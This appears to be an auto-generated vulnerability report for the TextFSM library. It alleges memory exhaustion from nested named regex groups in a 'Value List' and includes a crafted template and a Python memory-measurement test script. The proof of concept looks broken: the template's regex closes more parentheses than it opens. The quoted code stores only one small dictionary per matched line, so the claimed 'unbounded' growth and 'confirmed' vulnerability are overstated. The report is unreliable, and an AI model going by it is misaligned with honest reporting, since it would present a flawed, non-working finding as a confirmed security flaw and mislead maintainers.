### Vulnerability List

*   **Vulnerability Name:** Uncontrolled Resource Consumption via deeply nested regex groups in List Value

    *   **Description:**
        1.  An attacker crafts a TextFSM template containing a `Value List` definition.
        2.  Within the regular expression of this `Value List`, the attacker introduces deeply nested capturing groups, particularly named groups `(?P<name>...)`.
        3.  When TextFSM parses input text against this template, the regular expression engine attempts to capture and store the results of these nested groups for each match.
        4.  Due to the deeply nested nature of the groups, the internal data structures used by TextFSM to manage and store these captured groups can grow excessively large, consuming significant memory and potentially leading to performance degradation or program termination due to resource exhaustion.
        5.  This is especially pronounced when the input text contains numerous lines that match the malicious `Value List` rule, as the nested group capturing process is repeated for each line.

    *   **Impact:**
        An attacker can cause excessive resource consumption (memory) on the system running TextFSM. While this vulnerability might resemble a Denial of Service (DoS) in its effect, it technically falls under uncontrolled resource consumption leading to potential application-level issues, rather than a system-level DoS. If the application relying on TextFSM fails or behaves unexpectedly due to resource exhaustion, it can lead to broader security implications depending on the application's role.

    *   **Vulnerability Rank:** Medium

    *   **Currently Implemented Mitigations:**
        None. The code does not appear to have any specific mitigations against deeply nested regex groups in `Value List` definitions.

    *   **Missing Mitigations:**
        *   Implement limits on the depth or complexity of nested capturing groups allowed within `Value List` regular expressions. This could involve static analysis of the template during parsing or dynamic checks during runtime.
        *   Introduce resource limits (e.g., memory limits) for the parsing process to prevent unbounded resource consumption.
        *   Consider using regular expression engines or configurations that are more robust against resource exhaustion from nested groups.

    *   **Preconditions:**
        *   The attacker can provide a malicious TextFSM template to be used by the TextFSM library.
        *   The TextFSM library is used to parse input text provided by or influenced by the attacker.
        *   The template must define a `Value List` with a regular expression containing deeply nested capturing groups.

    *   **Source Code Analysis:**
        1.  **File:** `/code/textfsm/parser.py`
        2.  **Class:** `TextFSMOptions.List`
        3.  **Method:** `OnAssignVar(self)`
        4.  **Code Snippet:**
        ```python
        def OnAssignVar(self):
          # Nested matches will have more than one match group
          if self.value.compiled_regex.groups > 1:
            match = self.value.compiled_regex.match(self.value.value)
          else:
            match = None
          # If the List-value regex has match-groups defined, add the resulting
          # dict to the list. Otherwise, add the string that was matched
          if match and match.groupdict():
            self._value.append(match.groupdict())
          else:
            self._value.append(self.value.value)
        ```
        **Analysis:**
        *   The `OnAssignVar` method in the `TextFSMOptions.List` class is responsible for handling the assignment of values for `Value List` types.
        *   When a `Value List` is defined with nested named capturing groups in its regex (checked by `self.value.compiled_regex.groups > 1`), the code extracts the captured groups using `match.groupdict()` and appends this dictionary to `self._value` (which is a list associated with the Value).
        *   If an attacker crafts a regex with excessively deep nesting of named groups, each successful match of the rule will result in the creation and storage of a dictionary with a potentially very large number of keys and values due to the nested captures.
        *   Repeated matches against such a malicious rule, especially with long input texts, will lead to the unbounded growth of the `self._value` list and its contained dictionaries, resulting in uncontrolled memory consumption.
        *   The code does not implement any checks on the complexity or depth of these nested groups or any limits on the memory consumed during this process.

    *   **Security Test Case:**
        1.  **Create a malicious TextFSM template file (e.g., `malicious_template.textfsm`):**
        ```textfsm
        Value List MaliciousList (((((((((((?P<group1>.)?)(?P<group2>.)?)(?P<group3>.)?)(?P<group4>.)?)(?P<group5>.)?)(?P<group6>.)?)(?P<group7>.)?)(?P<group8>.)?)(?P<group9>.)?)(?P<group10>.)?))
        Value SomeValue (.*)

        Start
          ^${MaliciousList} -> Record
        ```
        This template defines a `Value List` named `MaliciousList` with a regex containing 10 levels of nested optional capturing groups.

        2.  **Create an input text file (e.g., `input_text.txt`):**
        ```text
        a
        b
        c
        ... (repeat many times, e.g., 1000 lines) ...
        z
        ```
        This input text contains multiple lines that will match the `MaliciousList` rule.

        3.  **Run the TextFSM parser with the malicious template and input text:**
        ```python
        import textfsm
        import time
        import psutil
        import os

        template_file = open("malicious_template.textfsm", "r")
        fsm = textfsm.TextFSM(template_file)
        input_file = open("input_text.txt", "r")
        input_data = input_file.read()

        process = psutil.Process(os.getpid())
        memory_before = process.memory_info().rss / 1024  # in KB
        start_time = time.time()

        try:
            results = fsm.ParseText(input_data)
            end_time = time.time()
            memory_after = process.memory_info().rss / 1024 # in KB
            print(f"Parsing successful. Time taken: {end_time - start_time:.4f} seconds")
            print(f"Memory usage before parsing: {memory_before:.2f} KB")
            print(f"Memory usage after parsing: {memory_after:.2f} KB")
            print(f"Memory increase: {memory_after - memory_before:.2f} KB")

        except Exception as e:
            end_time = time.time()
            memory_after = process.memory_info().rss / 1024 # in KB
            print(f"Parsing failed with error: {e}")
            print(f"Time taken before failure: {end_time - start_time:.4f} seconds")
            print(f"Memory usage before parsing: {memory_before:.2f} KB")
            print(f"Memory usage at failure: {memory_after:.2f} KB")
            print(f"Memory increase: {memory_after - memory_before:.2f} KB")

        template_file.close()
        input_file.close()
        ```

        4.  **Observe the memory usage:**
            Run the Python script and monitor the memory usage of the process. You should observe a significant increase in memory consumption as TextFSM parses the input text with the malicious template. The "Memory increase" value in the output should be substantial, indicating uncontrolled resource consumption. Depending on the number of nested groups and input lines, this could lead to program slowdown or even out-of-memory errors.

This test case demonstrates that a crafted template with deeply nested regex groups in a `Value List` can lead to uncontrolled memory consumption when parsing input text, confirming the vulnerability.